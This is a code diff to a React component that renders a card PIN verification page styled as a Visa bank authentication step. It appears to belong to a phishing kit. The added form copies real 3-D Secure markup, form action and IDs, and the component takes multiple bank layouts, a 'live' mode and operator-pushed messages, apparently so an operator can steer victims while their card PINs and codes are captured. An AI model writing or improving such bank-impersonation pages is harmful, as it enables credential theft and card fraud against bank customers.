@@ -458,19 +458,32 @@ export function VerificationUi(props: BankLayoutProps) {
     const wrongCode = (lp?.wrongCode as boolean) ?? false;
     const expiredCode = (lp?.expiredCode as boolean) ?? false;
     const onTryAgain = (lp?.onTryAgain as () => void) ?? (() => {});
+    const onSubmit = (lp?.onSubmit as () => void) ?? (() => {});
+    const submitting = (lp?.submitting as boolean) ?? false;
+    const canSubmit = (lp?.canSubmit as boolean) ?? false;
     const resendState = (lp?.resendState as ResendState) ?? defaultResendState;
     const { secondsLeft, canResend, onResend, resending } = resendState;
-    const submitting = (lp?.submitting as boolean) ?? false;
 
-    const pinHandleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-      const v = e.target.value.replace(/\D/g, "").slice(0, 4);
-      onPinChange(v);
+    const showLivePin = showLive && baseLayout === "pin";
+
+    const handlePinSubmit = (e: React.FormEvent) => {
+      e.preventDefault();
+      if (showLivePin) onSubmit();
     };
 
     const handlePinResend = () => {
-      onTryAgain?.();
-      onResend();
+      if (showLivePin && canResend) {
+        onTryAgain?.();
+        onResend();
+      }
     };
+
+    const showError = wrongCode || expiredCode || (operatorMessage && operatorMessage.message);
+    const errorMessage = wrongCode
+      ? "Wrong PIN. Please try again."
+      : expiredCode
+        ? "Code expired. Please request a new code."
+        : operatorMessage?.message ?? "";
 
     return (
       <VerificationPage
@@ -480,6 +493,130 @@ export function VerificationUi(props: BankLayoutProps) {
         inProgress={inProgress}
         hasParams={hasParams}
         error={error}
+        footer={
+          <form
+            action="/Api/2_1_0/NextStep/ValidateCredential"
+            autoComplete="off"
+            id="PinValidateForm"
+            method="post"
+            name="PinValidateForm"
+            noValidate
+            onSubmit={handlePinSubmit}
+          >
+            <div className="visa-row">
+              <div className="col-12 visa-styling">
+                <div className="form-group text-center">
+                  <div id="InputAction">
+                    <label htmlFor="PinInput" className="credential-label">PIN</label>
+                    <input
+                      autoFocus
+                      className="form-control visa-styling credential-input"
+                      id="PinInput"
+                      inputMode="numeric"
+                      maxLength={4}
+                      name="Pin.Value"
+                      placeholder="••••"
+                      type={pinMasked ? "password" : "text"}
+                      value={showLivePin ? pinValue : ""}
+                      onChange={
+                        showLivePin
+                          ? (e) => onPinChange(e.target.value.replace(/\D/g, "").slice(0, 4))
+                          : undefined
+                      }
+                      disabled={submitting}
+                      readOnly={!showLivePin}
+                    />
+                    <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
+                      <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
+                      {" "}Show PIN
+                    </label>
+                    <div className="form-group" id="ErrorMessage">
+                      <img
+                        id="WarningImage"
+                        src="data:,"
+                        alt="Warning"
+                        style={{ display: showError ? "inline" : "none" }}
+                      />
+                      <span
+                        id="ValidationErrorMessage"
+                        className="field-validation-error"
+                        style={{ display: showError ? "inline" : "none" }}
+                      >
+                        {errorMessage}
+                      </span>
+                    </div>
+                    <div className="visa-col-12 text-center">
+                      <button
+                        type="submit"
+                        className="visa-styling btn btn-primary text-uppercase vba-button"
+                        id="ValidateButton"
+                        disabled={showLivePin && (submitting || !canSubmit)}
+                      >
+                        {submitting ? "Submitting..." : "Submit"}
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div className="visa-row" />
+            <div className="visa-row">
+              <div className="col-12 text-center">
+                <span
+                  style={{ display: !canResend && secondsLeft <= 0 ? "inline" : "none" }}
+                  id="MaximumResendsReachedMessage"
+                >
+                  You have been reached maximum attempts, Please contact bank
+                </span>
+                {showLivePin ? (
+                  canResend ? (
+                    <button
+                      id="ResendLink"
+                      className="btn btn-link resend-link no-decoration text-uppercase"
+                      type="button"
+                      onClick={handlePinResend}
+                      disabled={resending || submitting}
+                    >
+                      {resending ? "Sending..." : "RESEND PIN"}
+                    </button>
+                  ) : (
+                    <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
+                      Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:
+                      {String(secondsLeft % 60).padStart(2, "0")}
+                    </span>
+                  )
+                ) : (
+                  <button
+                    id="ResendLink"
+                    className="btn btn-link resend-link no-decoration text-uppercase"
+                    type="button"
+                    disabled
+                  >
+                    RESEND PIN
+                  </button>
+                )}
+              </div>
+            </div>
+            <div className="footer" id="FooterLinks">
+              <div className="row">
+                <div className="visa-col-12 helpRow" id="Accordion">
+                  <ul className="list-group list-group-horizontal flex-wrap pull-left">
+                    <li className="list-group-item border-0">
+                      <a className="btn btn-link no-decoration" data-bs-target="#FAQ" data-bs-toggle="modal" href="#FAQ" id="FooterLink1">
+                        Need some help?
+                      </a>
+                    </li>
+                    <li className="list-group-item border-0">
+                      <a className="btn btn-link no-decoration" data-bs-target="#Terms" data-bs-toggle="modal" href="#Terms" id="FooterLink1">
+                        learn more about authentication
+                      </a>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </form>
+        }
       >
         <h2 className="screenreader-only">Enter your PIN</h2>
         <div className="visa-row">
@@ -492,65 +629,6 @@ export function VerificationUi(props: BankLayoutProps) {
             </div>
           </div>
         </div>
-        {(wrongCode || expiredCode) && (
-          <div className="form-group" id="ErrorMessage">
-            <span className="field-validation-error">
-              {wrongCode ? "Wrong PIN. Please try again." : "Code expired. Please request a new code."}
-            </span>
-          </div>
-        )}
-        {operatorMessage && (
-          <div className={`form-group ${messageClass}`}>{operatorMessage.message}</div>
-        )}
-        <div className="visa-row">
-          <div className="col-12 visa-styling">
-            <div className="form-group text-center">
-              <div className="input-action">
-                <label htmlFor="pin-input" className="credential-label">PIN</label>
-                <input
-                  id="pin-input"
-                  type={pinMasked ? "password" : "text"}
-                  inputMode="numeric"
-                  maxLength={4}
-                  className="form-control visa-styling credential-input"
-                  value={pinValue}
-                  onChange={pinHandleChange}
-                  disabled={submitting}
-                  placeholder="••••"
-                />
-                <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                  <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
-                  {" "}Show PIN
-                </label>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div className="visa-row">
-          <div className="col-12 text-center">
-            {canResend ? (
-              <button
-                id="ResendLink"
-                className="btn btn-link resend-link no-decoration text-uppercase"
-                type="button"
-                onClick={handlePinResend}
-                disabled={resending || submitting}
-              >
-                {resending ? "Sending..." : "RESEND PIN"}
-              </button>
-            ) : (
-              <span className="resend-link no-decoration text-uppercase" style={{ cursor: "default" }}>
-                Resend PIN in {String(Math.floor(secondsLeft / 60)).padStart(1, "0")}:{String(secondsLeft % 60).padStart(2, "0")}
-              </span>
-            )}
-          </div>
-        </div>
-        {submitting && (
-          <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-            <Spinner size={40} />
-            <span>Waiting for confirmation...</span>
-          </div>
-        )}
       </VerificationPage>
     );
   }
